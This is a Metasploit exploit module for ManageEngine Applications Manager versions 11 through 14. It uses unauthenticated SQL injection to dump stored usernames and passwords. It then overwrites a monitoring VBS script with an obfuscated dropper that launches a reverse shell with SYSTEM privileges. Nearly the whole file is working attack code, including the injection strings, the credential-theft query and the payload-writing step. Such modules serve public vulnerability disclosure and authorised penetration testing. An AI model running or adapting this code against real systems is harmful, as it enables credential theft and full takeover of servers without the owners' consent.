# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => "ManageEngine Applications Manager 11.0 < 14.0 SQL Injection / Remote Code Execution",
      &#039;Description&#039;    => %q(
        This module exploits sql and command injection vulnerability in the ManageEngine AM 14 and prior versions.
        An unauthenticated user can gain the authority of "system" on the server due to SQL injection vulnerability.
        Exploit allows the writing of the desired file to the system using the postgesql structure.
        Module is written over the payload by selecting a file with the extension ".vbs" that is used for monitoring 
        by the ManageEngine which working with "system" authority.

        In addition, it dumps the users and passwords from the database for us.
        Keep in mind! After the harmful ".vbs" file is written, the shell session may be a bit late.
        Because the ManageEngine application should run this file itself.
      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;AkkuS <Özkan Mustafa Akkuş>&#039;, # Discovery & PoC & Metasploit module @ehakkus
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://pentest.com.tr/exploits/ManageEngine-App-Manager-14-SQLi-Remote-Code-Execution.html&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;WfsDelay&#039; => 500,
          &#039;PAYLOAD&#039; => &#039;windows/shell_reverse_tcp&#039;,
          &#039;RPORT&#039; => 8443,
          &#039;SSL&#039; => true
        },
      &#039;Payload&#039; =>
        {
          &#039;Encoder&#039; => &#039;x86/shikata_ga_nai&#039;
        },
      &#039;Platform&#039;       => [&#039;win&#039;],
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
      &#039;Targets&#039;        =>
        [
           [&#039;AppManager 14&#039;, {}],
           [&#039;AppManager 13&#039;, {}],
           [&#039;AppManager 12&#039;, {}],
           [&#039;AppManager 11&#039;, {}]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Apr 17 2019&#039;,
      &#039;DefaultTarget&#039;  => 1))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the application&#039;, &#039;/&#039;])
      ]
    )
  end
##
# Check exploit vulnerability basically // &#039;Appears&#039; more convenient
##
  def check
    res = inject(Rex::Text.rand_text_alpha(1))

    if res.code = "200" && res.headers[&#039;set-cookie&#039;] =~ /JSESSIONID/
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end
##
##
  def get_payload

    handler
    payload = generate_payload_exe
    @vbs_content = Msf::Util::EXE.to_exe_vbs(payload)
    ## determining the target directory
    if target.name == &#039;AppManager 14&#039;
      tfile = "AppManager14"
    elsif target.name == &#039;AppManager 13&#039;
      tfile = "AppManager13"
    elsif target.name == &#039;AppManager 12&#039;
      tfile = "AppManager12"
    elsif target.name == &#039;AppManager 11&#039;
      tfile = "AppManager11"
    end

    fhashes = Rex::Text.rand_text_alpha_lower(8) + ".txt"
    ## parameters required to read the user table
    hashes = "sid=1;copy+(select+username,password+from+AM_UserPasswordTable)+to+$$"
    hashes << "c:\\Program+Files+(x86)\\ManageEngine\\"
    hashes << "#{tfile}"
    hashes << "\\working\\"
    hashes << "#{fhashes}"
    hashes << "$$;--"

    res = inject("#{hashes}")

    if res.code = "200" && res.headers[&#039;set-cookie&#039;] =~ /JSESSIONID/
      print_good("Users in the database were taken...")
      res = send_request_cgi({
        &#039;method&#039;   => &#039;GET&#039;,
        &#039;uri&#039;      => normalize_uri(target_uri.path, "#{fhashes}") # users file url
      })

      if res.code == "404"
       fail_with(Failure::Unreachable, &#039;The database could not be read!&#039;)
      else
       print_status("--------------------Usernames and Passwords---------------------")
       puts res.body # users table output
       print_status("----------------------------------------------------------------") 
      end 
    else
      fail_with(Failure::Unreachable, &#039;Connection error occurred!&#039;)
    end

    ## fetch base64 part in vbs payload
    pb64 = @vbs_content.split(&#039;"
	Dim&#039;)[0].split(&#039; = "&#039;)[2]
    ## vbs file in one line
    vbs_file = &#039;On Error Resume Next:Set objWbemLocator = CreateObject("WbemScripting.SWbemLocator"):&#039;
    vbs_file << &#039;if Err.Number Then:WScript.Echo vbCrLf & "Error # " & " " & Err.Description:End If:O&#039;
    vbs_file << &#039;n Error GoTo 0:On Error Resume Next:Select Case WScript.Arguments.Count:Case 2:strCo&#039;
    vbs_file << &#039;mputer = Wscript.Arguments(0):strQuery = Wscript.Arguments(1):Set wbemServices = obj&#039;
    vbs_file << &#039;WbemLocator.ConnectServer (strComputer,"Root\\CIMV2"):Case 4:strComputer = Wscript.A&#039;
    vbs_file << &#039;rguments(0):strUsername = Wscript.Arguments(1):strPassword = Wscript.Arguments(2):st&#039;
    vbs_file << &#039;rQuery = Wscript.Arguments(3):Set wbemServices = objWbemLocator.ConnectServer (strCo&#039;
    vbs_file << &#039;mputer,"Root\\CIMV2",strUsername,strPassword):case 6:strComputer = Wscript.Arguments&#039;
    vbs_file << &#039;(0):strUsername = Wscript.Arguments(1):strPassword = Wscript.Arguments(2):strQuery =&#039;
    vbs_file << &#039; Wscript.Arguments(4):namespace = Wscript.Arguments(5):Set wbemServices = objWbemLoca&#039;
    vbs_file << &#039;tor.ConnectServer (strComputer,namespace,strUsername,strPassword):Case Else:strMsg =&#039;
    vbs_file << &#039; "Error # in parameters passed":WScript.Echo strMsg:WScript.Quit(0):End Select:Set w&#039;
    vbs_file << &#039;bemServices = objWbemLocator.ConnectServer (strComputer, namespace, strUsername, str&#039;
    vbs_file << &#039;Password):if Err.Number Then:WScript.Echo vbCrLf & "Error # "  & " " & Err.Descriptio&#039;
    vbs_file << &#039;n:End If:On Error GoTo 0:On Error Resume Next:Set colItems = wbemServices.ExecQuery(s&#039;
    vbs_file << &#039;trQuery):if Err.Number Then:WScript.Echo vbCrLf & "Error # "  & " " & Err.Description&#039;
    vbs_file << &#039;:End If:On Error GoTo 0:i=0:For Each objItem in colItems:if i=0 then:header = "":For &#039;
    vbs_file << &#039;Each param in objItem.Properties_:header = header & param.Name & vbTab:Next:WScript.E&#039;
    vbs_file << &#039;cho header:i=1:end if:serviceData = "":For Each param in objItem.Properties_:serviceD&#039;
    vbs_file << &#039;ata = serviceData & param.Value & vbTab:Next:WScript.Echo serviceData:Next:Function b&#039;
    vbs_file << &#039;PBdVfYpfCEHF(hBPVZMitxq):HHgwqsqii = "<B64DECODE xmlns:dt="& Chr(34) & "urn:schemas-m&#039;
    vbs_file << &#039;icrosoft-com:datatypes" & Chr(34) & " " & "dt:dt=" & Chr(34) & "bin.base64" & Chr(34)&#039;
    vbs_file << &#039; & ">" & hBPVZMitxq & "</B64DECODE>":Set TInPBSeVlL = CreateObject("MSXML2.DOMDocument&#039;
    vbs_file << &#039;.3.0"):TInPBSeVlL.LoadXML(HHgwqsqii):bPBdVfYpfCEHF = TInPBSeVlL.selectsinglenode("B64D&#039;
    vbs_file << &#039;ECODE").nodeTypedValue:set TInPBSeVlL = nothing:End Function:Function txhYXYJJl():Emkf&#039;
    vbs_file << &#039;dMDdusgGha = "&#039;
    vbs_file << "#{pb64}"
    vbs_file << &#039;":Dim CCEUdwNSS:Set CCEUdwNSS = CreateObject("Scripting.FileSystemObject"):Dim zhgqIZn&#039;
    vbs_file << &#039;K:Dim gnnTqZvAcL:Set zhgqIZnK = CCEUdwNSS.GetSpecialFolder(2):gnnTqZvAcL = zhgqIZnK & &#039;
    vbs_file << &#039;"\" & CCEUdwNSS.GetTempName():CCEUdwNSS.CreateFolder(gnnTqZvAcL):yZUoLXnPic = gnnTqZvAc&#039;
    vbs_file << &#039;L & "\" & "SAEeVSXQVkDEIG.exe":Dim mEciydMZTsoBmAo:Set mEciydMZTsoBmAo = CreateObject("&#039;
    vbs_file << &#039;Wscript.Shell"):LXbjZKnEQUfaS = bPBdVfYpfCEHF(EmkfdMDdusgGha):Set TUCiiidRgJQdxTl = Cre&#039;
    vbs_file << &#039;ateObject("ADODB.Stream"):TUCiiidRgJQdxTl.Type = 1:TUCiiidRgJQdxTl.Open:TUCiiidRgJQdxT&#039;
    vbs_file << &#039;l.Write LXbjZKnEQUfaS:TUCiiidRgJQdxTl.SaveToFile yZUoLXnPic, 2:mEciydMZTsoBmAo.run yZU&#039;
    vbs_file << &#039;oLXnPic, 0, true:CCEUdwNSS.DeleteFile(yZUoLXnPic):CCEUdwNSS.DeleteFolder(gnnTqZvAcL):E&#039;
    vbs_file << &#039;nd Function:txhYXYJJl:WScript.Quit(0)&#039;
    ## encode the vbs file to base64 and then encode the url-hex
    encoding_vbs = Rex::Text.uri_encode(Rex::Text.encode_base64(vbs_file), &#039;hex-all&#039;)

    vbs_payload = "sid=1;copy+(select+convert_from(decode($$#{encoding_vbs}$$,$$base64$$)"
    vbs_payload << ",$$utf-8$$))+to+$$C:\\\\Program+Files+(x86)\\\\ManageEngine\\\\"
    vbs_payload << "#{tfile}"
    vbs_payload << "\\\\working\\\\conf\\\\application\\\\scripts\\\\wmiget.vbs$$;"

    res = inject("#{vbs_payload}")

    if res.code = "200" && res.headers[&#039;set-cookie&#039;] =~ /JSESSIONID/
      print_good("The harmful .vbs file was successfully written to the server.")
      print_status("Keep in mind! You may have to wait between 10-300 seconds for the shell session.")
    else
      fail_with(Failure::Unreachable, &#039;Connection error occurred!&#039;)
    end

    return payload
  end
##
# Call functions
##
  def exploit
    unless Exploit::CheckCode::Appears == check
      fail_with(Failure::NotVulnerable, &#039;Target is not vulnerable.&#039;)
    end
    get_payload

  end
##
# Inj payload
##
  def inject(payload)

    res = send_request_cgi(
      {
      &#039;method&#039; => &#039;POST&#039;,
      &#039;ctype&#039;  => &#039;application/x-www-form-urlencoded&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/jsp/Popup_SLA.jsp&#039;),
      &#039;data&#039; => payload
      }, 25)
    
  end
end
##
# The end of the adventure (o_O) // AkkuS
##

